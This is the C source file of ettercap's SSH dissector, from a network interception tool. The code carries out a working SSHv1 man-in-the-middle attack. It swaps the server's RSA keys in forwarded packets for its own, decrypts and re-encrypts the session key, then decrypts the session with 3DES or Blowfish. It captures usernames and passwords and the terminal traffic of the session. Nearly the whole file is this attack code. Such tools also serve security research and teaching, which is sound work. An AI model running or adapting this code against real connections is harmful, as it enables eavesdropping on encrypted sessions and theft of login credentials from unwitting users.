/*
    ettercap -- dissector ssh -- TCP 22

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_ssh.c,v 1.25 2004/05/27 10:59:52 alor Exp $
*/

#include <ec.h>
#include <ec_decode.h>
#include <ec_dissect.h>
#include <ec_session.h>
#include <ec_streambuf.h>
#include <ec_checksum.h>

/* don't include kreberos. RH sux !! */
#define OPENSSL_NO_KRB5 1

#include <openssl/ssl.h>
#include <openssl/des.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <zlib.h>

#define SMSG_PUBLIC_KEY 2
#define CMSG_SESSION_KEY 3
#define CMSG_USER 4
#define CMSG_AUTH_PASSWORD 9
#define CMSG_AUTH_RHOSTS 5
#define CMSG_AUTH_RSA 6
#define SMSG_SUCCESS 14
#define SMSG_FAILURE 15
#define CMSG_STDIN_DATA 16
#define SMSG_STDOUT_DATA 17
#define SMSG_STDERR_DATA 18
#define CMSG_REQUEST_COMPRESSION 37

#define SSH_CIPHER_NONE 0
#define SSH_CIPHER_3DES 3
#define SSH_CIPHER_BLOWFISH 6

/* My RSA keys */
typedef struct {
    RSA *myserverkey;
    RSA *myhostkey;
    u_int32 server_mod;
    u_int32 host_mod;
    u_char server_exp;
    u_char host_exp;
    struct ssh_my_key *next;
} ssh_my_key;

/* Session Key data */
typedef struct {
   RSA *serverkey;
   RSA *hostkey;
   ssh_my_key *ptrkey;
   void *key_state[2];
   void (*decrypt)(u_char *src, u_char *dst, int len, void *state);   
   struct stream_buf data_buffer[2];
      #define MAX_USER_LEN 64
   u_char user[MAX_USER_LEN + 1];
   u_char status;
      #define WAITING_CLIENT_BANNER 1
      #define WAITING_PUBLIC_KEY    2
      #define WAITING_SESSION_KEY   3
      #define WAITING_ENCRYPTED_PCK 4
   u_char compression_status;
      #define  NO_COMPRESSION       0
      #define  COMPRESSION_REQUEST  1
      #define  COMPRESSION_ON       2
} ssh_session_data;

struct des3_state
{
   des_key_schedule k1, k2, k3;
   des_cblock iv1, iv2, iv3;
};

struct blowfish_state 
{
   struct bf_key_st key;
   u_char iv[8];
};

/* globals */

/* Pointer to our RSA key list */
ssh_my_key *ssh_conn_key = NULL;

/* protos */

FUNC_DECODER(dissector_ssh);
void ssh_init(void);
static void put_bn(BIGNUM *bn, u_char **pp);
static void get_bn(BIGNUM *bn, u_char **pp);
static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n);
static void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key);
static void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key);
static void des3_decrypt(u_char *src, u_char *dst, int len, void *state);
static void *des3_init(u_char *sesskey, int len);
static void swap_bytes(const u_char *src, u_char *dst, int n);
static void *blowfish_init(u_char *sesskey, int len);
static void blowfish_decrypt(u_char *src, u_char *dst, int len, void *state);
static int32 read_packet(u_char **buffer, struct stream_buf *dbuf);

/************************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered decoder
 */

void __init ssh_init(void)
{
   dissect_add("ssh", APP_LAYER_TCP, 22, dissector_ssh);
}

FUNC_DECODER(dissector_ssh)
{
   struct ec_session *s = NULL;
   ssh_session_data *session_data;
   void *ident = NULL;
   char tmp[MAX_ASCII_ADDR_LEN];
   u_int32 ssh_len, ssh_mod;
   u_char ssh_packet_type, *ptr, *key_to_put;

   /* skip empty packets (ACK packets) */
   if (PACKET->DATA.len == 0)
      return NULL;

   dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_ssh));
   
   /* Is this a brand new session ?
    * If the aggressive dissectors are 
    * off performs only banner catching.
    */
   
   if ((!GBL_CONF->aggressive_dissectors || GBL_OPTIONS->unoffensive || GBL_OPTIONS->read) 
         || session_get(&s, ident, DISSECT_IDENT_LEN) == -ENOTFOUND) { 
      SAFE_FREE(ident);
      /* Create the session on first server's cleartext packet */
      if(!memcmp(PACKET->DATA.data,"SSH-", 4) && FROM_SERVER("ssh", PACKET)) {

         /* Only if we are interested on key substitution */         
         if (GBL_CONF->aggressive_dissectors && !GBL_OPTIONS->unoffensive && !GBL_OPTIONS->read) {
            dissect_create_session(&s, PACKET, DISSECT_CODE(dissector_ssh));
            SAFE_CALLOC(s->data, sizeof(ssh_session_data), 1);
            session_put(s);
            session_data =(ssh_session_data *)s->data;
            session_data->status = WAITING_CLIENT_BANNER;
         }

         /* Catch the version banner */
         PACKET->DISSECTOR.banner = strdup(PACKET->DATA.data);
         
         /* remove the \n */
         if ( (ptr = strchr(PACKET->DISSECTOR.banner, '\n')) != NULL )
            *ptr = '\0';
      }      
   } else { /* The session exists */
      session_data =(ssh_session_data *)s->data;
      SAFE_FREE(ident);
      
      /* If we are ready to decrypt packets */
      if (session_data->status == WAITING_ENCRYPTED_PCK) {
         u_char direction, *crypted_packet = NULL, *clear_packet = NULL;
         u_int32 data_len;
	 
         /* Check what key and stream buffer we have to use */	 
         if(FROM_SERVER("ssh", PACKET))
            direction = 0;
         else
            direction = 1;

         /* Add this packet to the stream */
         streambuf_seq_add(&(session_data->data_buffer[direction]), PACKET);
       
         /* We are decrypting, so we'll arrange disp_data by our own */
         PACKET->DATA.disp_len = 0;
	 
         /* While there are packets to read from the stream */
         while(read_packet(&crypted_packet, &(session_data->data_buffer[direction])) == ESUCCESS) {        
            ssh_len = pntol(crypted_packet);
            ssh_mod = 8 - (ssh_len % 8);

            /* SAFE_CALLOC is too drastic for errors */
            if (ssh_len > INT16_MAX) {
               SAFE_FREE(crypted_packet);
               return NULL;
            }

            SAFE_CALLOC(clear_packet, ssh_len + ssh_mod, 1);
	        
            /* Decrypt the packet (jumping over pck len) using correct key */
	    if (session_data->decrypt)
               session_data->decrypt(crypted_packet + 4, clear_packet, ssh_len + ssh_mod, session_data->key_state[direction]);

            if (session_data->compression_status == COMPRESSION_ON) {
               /* XXX Handle compressed packets */ 
            }
	    
            /* Catch packet type and slide to the data */
            ptr = clear_packet + ssh_mod;
            ssh_packet_type = *ptr;
            ptr++;

            /* Catch data len and slide to the payload */
            data_len = pntol(ptr);
            ptr += 4;

            /* USER */
            if (ssh_packet_type == CMSG_USER) {
               DEBUG_MSG("\tDissector_ssh USER");
               /* User will always be NULL terminated 
                * (it's calloc'd MAX_USER_LEN + 1)
                */
                memcpy(session_data->user, ptr, (data_len>MAX_USER_LEN) ? MAX_USER_LEN : data_len);
                
            /* AUTH_PASSWORD */    
            } else if (ssh_packet_type == CMSG_AUTH_PASSWORD) {
               DEBUG_MSG("\tDissector_ssh PASS");
               /* avoid bof */
               if (data_len > MAX_USER_LEN) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }
               if (data_len > 0) {
                  SAFE_CALLOC(PACKET->DISSECTOR.pass, data_len + 1, 1);	    
                  memcpy(PACKET->DISSECTOR.pass, ptr, data_len);
               } else
                  PACKET->DISSECTOR.pass = strdup("(empty)");
		  
               PACKET->DISSECTOR.user = strdup(session_data->user); /* Surely NULL terminated */
               DISSECT_MSG("SSH : %s:%d -> USER: %s  PASS: %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                               ntohs(PACKET->L4.dst),
                                                               PACKET->DISSECTOR.user,
                                                               PACKET->DISSECTOR.pass);

            } else if (ssh_packet_type == CMSG_AUTH_RHOSTS) {
               DEBUG_MSG("\tDissector_ssh RHOSTS");
               PACKET->DISSECTOR.user = strdup(session_data->user);
               /* XXX Do we need to catch more infos from this kind of packet? */
               PACKET->DISSECTOR.pass = strdup("RHOSTS-AUTH\n");
               DISSECT_MSG("SSH : %s:%d -> USER: %s  %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                         ntohs(PACKET->L4.dst),
                                                         PACKET->DISSECTOR.user,
                                                         PACKET->DISSECTOR.pass);
            } else if (ssh_packet_type == CMSG_AUTH_RSA) {
               DEBUG_MSG("\tDissector_ssh RSA AUTH");
               PACKET->DISSECTOR.user = strdup(session_data->user);
               PACKET->DISSECTOR.pass = strdup("RSA-AUTH\n");
               DISSECT_MSG("SSH : %s:%d -> USER: %s  %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                         ntohs(PACKET->L4.dst),
                                                         PACKET->DISSECTOR.user,
                                                         PACKET->DISSECTOR.pass);
               
            } else if (ssh_packet_type == CMSG_REQUEST_COMPRESSION) {
               
               session_data->compression_status = COMPRESSION_REQUEST;
               
            } else if (session_data->compression_status == COMPRESSION_REQUEST) {
               
               if (ssh_packet_type == SMSG_SUCCESS) {
                  session_data->compression_status = COMPRESSION_ON;
                  /* XXX We should notify top half */
               }
               if (ssh_packet_type == SMSG_FAILURE)
                  session_data->compression_status = NO_COMPRESSION;
            }
	    
            /* These are readable packets so copy it in the DISPDATA */
            if ((ssh_packet_type>=CMSG_STDIN_DATA && ssh_packet_type<=SMSG_STDERR_DATA) ||
                 ssh_packet_type == 4 || ssh_packet_type == 9) {
               u_char *temp_disp_data;

               /* Avoid int overflow or bogus data_len (realloc is too optimistic) */
               if ((PACKET->DATA.disp_len + data_len + 1 < PACKET->DATA.disp_len) || (data_len > ssh_len)) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }
		  	        
               /* Add this decrypted packet to the disp_data. 
                * There can be more than one ssh packet in a tcp pck.
                * We use a temp buffer to not feed top half with a null 
                * pointer to disp_data.                
                */
               temp_disp_data = (u_char *)realloc(PACKET->DATA.disp_data, PACKET->DATA.disp_len + data_len + 1);
               if (temp_disp_data == NULL) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }

               PACKET->DATA.disp_data = temp_disp_data;
               memcpy(PACKET->DATA.disp_data+PACKET->DATA.disp_len, ptr, data_len); 		  	       
               PACKET->DATA.disp_len += data_len;
            }

            SAFE_FREE(clear_packet);	 
            SAFE_FREE(crypted_packet);
         }
	 	 
         /* We are no longer interested on key stuff */
         return NULL;
      }

      /* We are not ready to decrypt packets because 
       * we are still waiting for some key stuff.
       */
      /* We need the packet to be forwardable to mangle
       * key exchange. Otherwise wipe the session.
       */
      if(!(PACKET->flags & PO_FORWARDABLE)) {
         dissect_wipe_session(PACKET, DISSECT_CODE(dissector_ssh));
         return NULL;
      }
       
      /* Catch packet type and skip to data. 
       * Doing this for client's cleartext
       * banner packet is safe too.
       */
      ssh_len = pntol(PACKET->DATA.data);
      ssh_mod = 8 - (ssh_len % 8);
      ptr = PACKET->DATA.data + 4 + ssh_mod;
      ssh_packet_type = *ptr;
      ptr++;

      if(FROM_SERVER("ssh", PACKET)) {  /* Server Packets (Public Key) */
      
         /* Enter if we are waiting for PublicKey packet.
          * Enter even if we are waiting for SessionKey:
          * if the server sends the public key twice we have 
          * to replace both. 
          */	  
         if ((session_data->status == WAITING_PUBLIC_KEY || session_data->status == WAITING_SESSION_KEY) && ssh_packet_type == SMSG_PUBLIC_KEY) {
            ssh_my_key **index_ssl;
            u_int32 server_mod, host_mod, cypher_mask, my_mask=0;
            BN_ULONG server_exp, host_exp;
	     
            /* Set the mask to 3DES or blowfish (if supported) */
            cypher_mask = *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 12);
            cypher_mask = htonl(cypher_mask);
            if (cypher_mask & (1<<SSH_CIPHER_3DES)) 
               my_mask |= (1<<SSH_CIPHER_3DES);
	       
            if (cypher_mask & (1<<SSH_CIPHER_BLOWFISH)) 
               my_mask |= (1<<SSH_CIPHER_BLOWFISH);
	       
            if (!my_mask) {
               dissect_wipe_session(PACKET, DISSECT_CODE(dissector_ssh));
               return NULL;
            }
	    
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 12) = htonl(my_mask);

            /* Remember where to put the key */
            ptr += 8; 
            key_to_put = ptr;
	    	    
            /* If it's the first time we catch the public key */
            if (session_data->ptrkey == NULL) { 
               /* Initialize RSA key structures (other fileds are set to 0) */
               session_data->serverkey = RSA_new();
               session_data->serverkey->n = BN_new();
               session_data->serverkey->e = BN_new();

               session_data->hostkey = RSA_new();
               session_data->hostkey->n = BN_new();
               session_data->hostkey->e = BN_new();

               /* Get the RSA Key from the packet */
               NS_GET32(server_mod,ptr);
               if (ptr + (server_mod/8) > PACKET->DATA.data + PACKET->DATA.len) {
                  DEBUG_MSG("Dissector_ssh Bougs Server_Mod");
                  return NULL;
               }
               get_bn(session_data->serverkey->e, &ptr);
               get_bn(session_data->serverkey->n, &ptr);

               NS_GET32(host_mod,ptr);
               if (ptr + (host_mod/8) > PACKET->DATA.data + PACKET->DATA.len) {
                  DEBUG_MSG("Dissector_ssh Bougs Host_Mod");
                  return NULL;
               }
               get_bn(session_data->hostkey->e, &ptr);
               get_bn(session_data->hostkey->n, &ptr);

               server_exp = *(session_data->serverkey->e->d);
               host_exp   = *(session_data->hostkey->e->d);

               /* Check if we already have a suitable RSA key to substitute */
               index_ssl = &ssh_conn_key;
               while(*index_ssl != NULL && 
                     ((*index_ssl)->server_mod != server_mod || 
                      (*index_ssl)->host_mod != host_mod || 
                      (*index_ssl)->server_exp != server_exp || 
                      (*index_ssl)->host_exp != host_exp))
                  index_ssl = (ssh_my_key **)&((*index_ssl)->next);

               /* ...otherwise generate it */
               if (*index_ssl == NULL) {
                  SAFE_CALLOC(*index_ssl, 1, sizeof(ssh_my_key));

                  /* Generate the new key */
                  (*index_ssl)->myserverkey = (RSA *)RSA_generate_key(server_mod, server_exp, NULL, NULL);
                  (*index_ssl)->myhostkey = (RSA *)RSA_generate_key(host_mod, host_exp, NULL, NULL);
                  (*index_ssl)->server_mod = server_mod;
                  (*index_ssl)->host_mod = host_mod;
                  (*index_ssl)->server_exp = server_exp;
                  (*index_ssl)->host_exp = host_exp;		  
                  (*index_ssl)->next = NULL;
                  if ((*index_ssl)->myserverkey == NULL || (*index_ssl)->myhostkey == NULL) {
                     SAFE_FREE(*index_ssl);
                     return NULL;
                  }
               }
	    
               /* Assign the key to the session */
               session_data->ptrkey = *index_ssl;
            }

            /* Put our RSA key in the packet */
            key_to_put+=4;
            put_bn(session_data->ptrkey->myserverkey->e, &key_to_put);
            put_bn(session_data->ptrkey->myserverkey->n, &key_to_put);
            key_to_put+=4;
            put_bn(session_data->ptrkey->myhostkey->e, &key_to_put);
            put_bn(session_data->ptrkey->myhostkey->n, &key_to_put);

            /* Recalculate SSH crc */
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 4) = htonl(CRC_checksum(PACKET->DATA.data+4, PACKET->DATA.len-8, CRC_INIT_ZERO));
	                
            PACKET->flags |= PO_MODIFIED;	 
            session_data->status = WAITING_SESSION_KEY;
         }	 
      } else { /* Client Packets */
         if (session_data->status == WAITING_CLIENT_BANNER) {
            /* Client Banner */
            if (!memcmp(PACKET->DATA.data,"SSH-2",5)) {
               DEBUG_MSG("Dissector_ssh SSHv2");
               dissect_wipe_session(PACKET, DISSECT_CODE(dissector_ssh));
            } else
               session_data->status = WAITING_PUBLIC_KEY;
         } else if (session_data->status == WAITING_SESSION_KEY && ssh_packet_type == CMSG_SESSION_KEY) {
            /* Ready to catch and modify SESSION_KEY */
            u_char cookie[8], sesskey[32], session_id1[16], session_id2[16], cypher;
            u_char *temp_session_id;
            BIGNUM *enckey, *bn;
            u_int32 i;

            /* Get the cypher and the cookie */
            cypher = *ptr;
            if (cypher != SSH_CIPHER_3DES && cypher != SSH_CIPHER_BLOWFISH) {
               dissect_wipe_session(PACKET, DISSECT_CODE(dissector_ssh));
               return NULL;
            }
	    
            memcpy(cookie, ++ptr, 8);
            ptr += 8; 
            key_to_put = ptr;

            /* Calculate real session id and our fake session id */
            temp_session_id = ssh_session_id(cookie, session_data->hostkey->n, session_data->serverkey->n);
            if (temp_session_id)
               memcpy(session_id1, temp_session_id, 16);
            temp_session_id=ssh_session_id(cookie, session_data->ptrkey->myhostkey->n, session_data->ptrkey->myserverkey->n);
            if (temp_session_id)
               memcpy(session_id2, temp_session_id, 16);

            /* Get the session key */
            enckey = BN_new();
            get_bn(enckey, &ptr);

            /* Decrypt session key */
            if (BN_cmp(session_data->ptrkey->myserverkey->n, session_data->ptrkey->myhostkey->n) > 0) {
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myserverkey);
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myhostkey);
            } else {
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myhostkey);
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myserverkey);
            }

            BN_mask_bits(enckey, sizeof(sesskey) * 8);
            i = BN_num_bytes(enckey);
            memset(sesskey, 0, sizeof(sesskey));
            BN_bn2bin(enckey, sesskey + sizeof(sesskey) - i);
            BN_clear_free(enckey);

            for (i = 0; i < 16; i++)
              sesskey[i] ^= session_id2[i];

            /* Save SessionKey */
            if (cypher == SSH_CIPHER_3DES) {
               session_data->key_state[0] = des3_init(sesskey, sizeof(sesskey));
               session_data->key_state[1] = des3_init(sesskey, sizeof(sesskey));
               session_data->decrypt = des3_decrypt;
            } else if (cypher == SSH_CIPHER_BLOWFISH) {
               session_data->key_state[0] = blowfish_init(sesskey, sizeof(sesskey));
               session_data->key_state[1] = blowfish_init(sesskey, sizeof(sesskey));
               session_data->decrypt = blowfish_decrypt;
            }
	    
            /* Re-encrypt SessionKey with the real RSA key */
            bn = BN_new();
            BN_set_word(bn, 0);

            for (i = 0; i < sizeof(sesskey); i++)  {
              BN_lshift(bn, bn, 8);
              if (i < 16) 
                 BN_add_word(bn, sesskey[i] ^ session_id1[i]);
              else 
                 BN_add_word(bn, sesskey[i]);
            }

            if (BN_cmp(session_data->serverkey->n, session_data->hostkey->n) < 0) {
               rsa_public_encrypt(bn, bn, session_data->serverkey);
               rsa_public_encrypt(bn, bn, session_data->hostkey);
            } else {
               rsa_public_encrypt(bn, bn, session_data->hostkey);
               rsa_public_encrypt(bn, bn, session_data->serverkey);
            }

            /* Clear the session */
            RSA_free(session_data->serverkey);
            RSA_free(session_data->hostkey);

            /* Put right Session Key in the packet */
            put_bn(bn, &key_to_put);
            BN_clear_free(bn);

            /* Re-calculate SSH crc */
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 4) = htonl(CRC_checksum(PACKET->DATA.data+4, PACKET->DATA.len-8, CRC_INIT_ZERO));

            /* XXX Here we should notify the top half that the 
             * connection is decrypted 
             */

            /* Initialize the stream buffers for decryption */
            streambuf_init(&(session_data->data_buffer[0])); 
            streambuf_init(&(session_data->data_buffer[1]));
	    
            PACKET->flags |= PO_MODIFIED;	 
            session_data->status = WAITING_ENCRYPTED_PCK;
         }      
      }
   }
       
   return NULL;
}      

/* Read a crypted packet from the stream. 
 * The buffer is dynamically allocated, so
 * calling function has to free it.
 */
static int32 read_packet(u_char **buffer, struct stream_buf *dbuf)
{
   int32 length, mod;
   
   /* Read packet length and calculate modulus */
   if (streambuf_read(dbuf, (u_char *)&length, 4, STREAM_ATOMIC) == -EINVALID)
      return -EINVALID;
   length = ntohl(length);   
   mod = 8 - (length % 8);

   /* Allocate the buffer and read the whole packet 
    * SAFE_CALLOC is not good to handle errors.    
    */
   *buffer = (u_char *)malloc(length + mod + 4);
   if (*buffer == NULL)
      return -EINVALID;
      
   if (streambuf_get(dbuf, *buffer, length + mod + 4, STREAM_ATOMIC) == -EINVALID) {
      SAFE_FREE(*buffer);
      return -EINVALID;
   }
      
   return ESUCCESS;
}

/* 3DES and blowfish stuff - Thanks to Dug Song ;) */
static void *des3_init(u_char *sesskey, int len)
{
   struct des3_state *state;

   state = malloc(sizeof(*state));

   des_set_key((void *)sesskey, (state->k1));
   des_set_key((void *)(sesskey + 8), (state->k2));

   if (len <= 16)
      des_set_key((void *)sesskey, (state->k3));
   else
      des_set_key((void *)(sesskey + 16), (state->k3));

   memset(state->iv1, 0, 8);
   memset(state->iv2, 0, 8);
   memset(state->iv3, 0, 8);

   return (state);
}

static void des3_decrypt(u_char *src, u_char *dst, int len, void *state)
{
   struct des3_state *dstate;

   dstate = (struct des3_state *)state;
   memcpy(dstate->iv1, dstate->iv2, 8);

   des_ncbc_encrypt(src, dst, len, (dstate->k3), &dstate->iv3, DES_DECRYPT);
   des_ncbc_encrypt(dst, dst, len, (dstate->k2), &dstate->iv2, DES_ENCRYPT);
   des_ncbc_encrypt(dst, dst, len, (dstate->k1), &dstate->iv1, DES_DECRYPT);
}

static void swap_bytes(const u_char *src, u_char *dst, int n)
{
   char c[4];
	
   for (n = n / 4; n > 0; n--) {
      c[3] = *src++; c[2] = *src++;
      c[1] = *src++; c[0] = *src++;
      *dst++ = c[0]; *dst++ = c[1];
      *dst++ = c[2]; *dst++ = c[3];
   }
}

static void *blowfish_init(u_char *sesskey, int len)
{
   struct blowfish_state *state;

   state = malloc(sizeof(*state));
   BF_set_key(&state->key, len, sesskey);
   memset(state->iv, 0, 8);
   return (state);
}


static void blowfish_decrypt(u_char *src, u_char *dst, int len, void *state)
{
   struct blowfish_state *dstate;

   dstate = (struct blowfish_state *)state;
   swap_bytes(src, dst, len);
   BF_cbc_encrypt((void *)dst, dst, len, &dstate->key, dstate->iv, BF_DECRYPT);
   swap_bytes(dst, dst, len);
}

static void put_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   i = BN_num_bits(bn);
   NS_PUT16(i, *pp);
   *pp+=BN_bn2bin(bn, *pp);
}

static void get_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   NS_GET16(i, *pp);
   i = ((i + 7) / 8);
   BN_bin2bn(*pp, i, bn);
   *pp += i;
}

static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n)
{
   static u_char sessid[16];
   u_int i, j;
   u_char *p;

   i = BN_num_bytes(hostkey_n);
   j = BN_num_bytes(serverkey_n);

   if ((p = malloc(i + j + 8)) == NULL)
      return (NULL);

   BN_bn2bin(hostkey_n, p);
   BN_bn2bin(serverkey_n, p + i);
   memcpy(p + i + j, cookie, 8);

   MD5(p, i + j + 8, sessid);
   free(p);

   return (sessid);
}

static void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int32 len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_public_encrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   if (len != -1)
      BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}

static void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int32 len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_private_decrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   if (len != -1)
      BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}


/* EOF */

// vim:ts=3:expandtab
